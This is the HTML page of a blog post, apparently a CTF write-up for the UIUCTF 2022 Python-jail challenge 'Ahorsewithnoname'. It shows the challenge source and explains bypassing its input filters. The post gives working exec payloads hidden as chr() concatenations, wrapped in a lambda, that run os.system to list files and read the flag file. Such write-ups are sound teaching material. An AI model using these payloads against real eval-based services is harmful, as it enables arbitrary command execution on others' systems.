@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        UIUCTF Ahorsewithnoname ::
+        Code[&amp;Pwn]
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="&amp;ldquo;really confused horse in rembrandt style &amp;ldquo;
+Can you make it through the desert on a horse with no names?
+nc horse.chal.uiuc.tf 1337
+author: kmh
+Handout Dockerfile # Copyright 2020 Google LLC # # Licensed under the Apache License, Version 2.0 (the &amp;#34;License&amp;#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an &amp;#34;AS IS&amp;#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/ahorsewithnoname/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="UIUCTF Ahorsewithnoname"/>
+<meta name="twitter:description" content="&ldquo;really confused horse in rembrandt style &ldquo;
+Can you make it through the desert on a horse with no names?
+nc horse.chal.uiuc.tf 1337
+author: kmh
+Handout Dockerfile # Copyright 2020 Google LLC # # Licensed under the Apache License, Version 2.0 (the &#34;License&#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an &#34;AS IS&#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."/>
+
+
+
+<meta property="og:title" content="UIUCTF Ahorsewithnoname" />
+<meta property="og:description" content="&ldquo;really confused horse in rembrandt style &ldquo;
+Can you make it through the desert on a horse with no names?
+nc horse.chal.uiuc.tf 1337
+author: kmh
+Handout Dockerfile # Copyright 2020 Google LLC # # Licensed under the Apache License, Version 2.0 (the &#34;License&#34;); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # https://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an &#34;AS IS&#34; BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/ahorsewithnoname/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-31T19:40:57-06:00" />
+<meta property="article:modified_time" content="2022-07-31T19:40:57-06:00" /><meta property="og:site_name" content="Code[&amp;Pwn]" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Code[&amp;Pwn]</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/contact">Contact</a></li>
+      
+    
+      
+        <li><a href="/posts">Posts</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">UIUCTF Ahorsewithnoname</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-07-31
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p><img src="/img/ahorsewithnonames.png" alt=""></p>
+<p><em>&ldquo;really confused horse in rembrandt style &ldquo;</em></p>
+<p>Can you make it through the desert on <a href="https://www.youtube.com/watch?v=na47wMFfQCo">a horse with no names</a>?</p>
+<p><code>nc horse.chal.uiuc.tf 1337</code></p>
+<p><strong>author</strong>: kmh</p>
+<h2 id="handout">Handout</h2>
+<h4 id="dockerfile">Dockerfile</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># Copyright 2020 Google LLC</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Licensed under the Apache License, Version 2.0 (the &#34;License&#34;);</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># you may not use this file except in compliance with the License.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># You may obtain a copy of the License at</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#     https://www.apache.org/licenses/LICENSE-2.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unless required by applicable law or agreed to in writing, software</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># distributed under the License is distributed on an &#34;AS IS&#34; BASIS,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># See the License for the specific language governing permissions and</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># limitations under the License.</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">FROM ubuntu:20.04 as chroot</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">RUN apt-get update &amp;&amp; apt-get install -y python3 &amp;&amp; rm -rf /var/lib/apt/lists/*</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">RUN /usr/sbin/useradd --no-create-home -u 1000 user</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">COPY flag.txt /</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">COPY desert.py /home/user/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">FROM gcr.io/kctf-docker/challenge@sha256:d884e54146b71baf91603d5b73e563eaffc5a42d494b1e32341a5f76363060fb</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">COPY --from=chroot / /chroot</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">COPY nsjail.cfg /home/user/</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">CMD kctf_setup &amp;&amp; \</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">kctf_drop_privs \</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">socat \</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">TCP-LISTEN:1337,reuseaddr,fork \</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ae81ff">EXEC:&#34;kctf_pow nsjail --config /home/user/nsjail.cfg -- /bin/python3 /home/user/desert.py&#34;</span>
+</span></span></code></pre></div><h4 id="desertpy">desert.py</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>horse <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Begin your journey: &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[a-zA-Z]</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">&#34;</span>, horse):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;It has begun raining, so you return home.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> len(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse))) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>    print(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse)))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;A single horse cannot bear the weight of all those special characters. You return home.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    discovery <span style="color:#f92672">=</span> list(eval(compile(horse, <span style="color:#e6db74">&#34;&lt;horse&gt;&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>)<span style="color:#f92672">.</span>replace(co_names<span style="color:#f92672">=</span>())))
+</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(discovery)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;You make it through the journey, but are severely dehydrated. This is all you can remember:&#34;</span>, discovery)
+</span></span></code></pre></div><h2 id="solution">Solution</h2>
+<h4 id="analysis-of-desertpy">Analysis of desert.py</h4>
+<p>Desert.py imports a few python modules, collects input from the user, and then runs several checks before processing it.</p>
+<ol>
+<li><code>if re.match(r&quot;[a-zA-Z]{4}&quot;, horse):</code> - Checks if the first four characters in the provided input are letters. If all four are, then the program exits.</li>
+<li><code>elif len(set(re.findall(r&quot;[\W]&quot;, horse))) &gt; 4:</code> - This if statement, returns all unique the special characters such as _.() etc. If there are more than four unique special characters, then again the program prints a line and exits. If these were letters than, <code>AAAAAABBBBBCCCCCDDDDD</code> would be accepted while <code>ABCDEFGHIJKLMNOP</code> would not be since it has more unique characters.</li>
+</ol>
+<p>If neither of the above conditions are met, the final else statemen is executed which includes an eval statement. Since the source code is provided, these conditions can be handled one by one through editing of the desert.py script.</p>
+<h4 id="special-character-check">Special Character Check</h4>
+<h5 id="edited-desertpy">Edited desert.py</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>horse <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Begin your journey: &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if re.match(r&#34;[a-zA-Z]{4}&#34;, horse):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    print(&#34;It has begun raining, so you return home.&#34;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse))) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>    print(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse)))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;A single horse cannot bear the weight of all those special characters. You return home.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    discovery <span style="color:#f92672">=</span> list(eval(compile(horse, <span style="color:#e6db74">&#34;&lt;horse&gt;&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>)<span style="color:#f92672">.</span>replace(co_names<span style="color:#f92672">=</span>())))
+</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(discovery)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;You make it through the journey, but are severely dehydrated. This is all you can remember:&#34;</span>, discovery)
+</span></span></code></pre></div><p>There are several options to bypass the check for special characters. The submitted payload can be encoded in Hex or Octal formats. Both of these limit the number of printed special characters. These can be converted back to plain text but they aren&rsquo;t executed by the script. Instead, each character can be converted to a character code and then placed in side an <code>exec()</code> function to make sure it is executed. The gnarly cyberchef link below can can be used to most of the tedious portion of conversion.</p>
+<pre tabindex="0"><code>https://cyberchef.org/#recipe=To_Hex(&#39;\\x&#39;,0/disabled)To_Charcode(&#39;Space&#39;,10)Find_/_Replace({&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;},&#39; chr(&#39;,true,false,true,false)Find_/_Replace({&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;},&#39;%2B&#39;,true,false,true,false)Find_/_Replace({&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\%2B&#39;},&#39;)%2B&#39;,true,false,true,false)&amp;input=cHJpbnQoJ1JDRScpOyBfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY2F0IC9mbGFnLnR4dCcp
+</code></pre><p>Wrapped in exec this leaves us with,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>exec(chr(<span style="color:#ae81ff">112</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">114</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">105</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">110</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">82</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">67</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">69</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">59</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">32</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">105</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">109</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">112</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">111</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">114</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">111</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">46</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">121</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">101</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">109</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">108</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>))
+</span></span></code></pre></div><p>Running locally, this can seen to print a line and list the files in the current directory.
+<img src="/img/ahorsewithnonames-part1.png" alt=""></p>
+<h4 id="four-letter-check">Four Letter Check</h4>
+<h4 id="edited-desertpy-1">Edited desert.py</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>horse <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Begin your journey: &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[a-zA-Z]</span><span style="color:#e6db74">{4}</span><span style="color:#e6db74">&#34;</span>, horse):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;It has begun raining, so you return home.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> len(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse))) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>    print(set(re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;[\W]&#34;</span>, horse)))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;A single horse cannot bear the weight of all those special characters. You return home.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    discovery <span style="color:#f92672">=</span> list(eval(compile(horse, <span style="color:#e6db74">&#34;&lt;horse&gt;&#34;</span>, <span style="color:#e6db74">&#34;eval&#34;</span>)<span style="color:#f92672">.</span>replace(co_names<span style="color:#f92672">=</span>())))
+</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(discovery)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;You make it through the journey, but are severely dehydrated. This is all you can remember:&#34;</span>, discovery)
+</span></span></code></pre></div><p>Locally, there was a fairly simple solution of adding and extra set of parentheses around the whole previous payload.</p>
+<p><img src="/img/ahorsewithnonames-part2-attempt1.png" alt=""></p>
+<p>However, when this attempted on the remote instance for the actual challenge, the response just hangs. This lead to a lot of researching looking for something in python that started with a number or special character that did function remotely.</p>
+<h4 id="lambda">Lambda</h4>
+<p>Lambda&rsquo;s are anonymous functions. This means they typically don&rsquo;t have names.  Below is an example where a lambda function is defined that takes in two values, adds them, and then returns the compiled value. It is then called with the arguments 2 and 3 leading to an output of 5.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> (<span style="color:#66d9ef">lambda</span> x, y: x <span style="color:#f92672">+</span> y)(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span>
+</span></span></code></pre></div><p>Notice that this format starts with a special character. This allows the crafting of the following payload. Here a lambda function is defined that takes in no arguments but then runs our previously functionally exec payload. It is then immediately called with no arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>(<span style="color:#66d9ef">lambda</span>:exec(chr(<span style="color:#ae81ff">112</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">114</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">105</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">110</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">82</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">67</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">69</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">59</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">32</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">105</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">109</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">112</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">111</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">114</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">95</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">111</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">46</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">121</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">115</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">101</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">109</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">99</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">97</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">32</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">47</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">102</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">108</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">97</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">103</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">46</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">120</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">116</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">39</span>)<span style="color:#f92672">+</span>chr(<span style="color:#ae81ff">41</span>)))()
+</span></span></code></pre></div><p><img src="/img/ahorsewithnonames-flag.png" alt=""></p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/frame/">
+                  <span class="button__text">UIUCTF Frame</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">2022</div>
+      
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
